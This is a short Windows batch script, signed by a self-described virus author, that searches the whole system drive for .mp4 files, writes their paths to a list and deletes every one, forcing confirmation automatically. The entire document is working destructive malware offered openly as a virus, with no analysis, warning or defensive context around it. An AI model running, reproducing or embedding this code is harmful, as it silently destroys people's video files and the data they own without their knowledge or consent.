@ echo off

rem ---------------------------------
rem Delete All Mp4
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__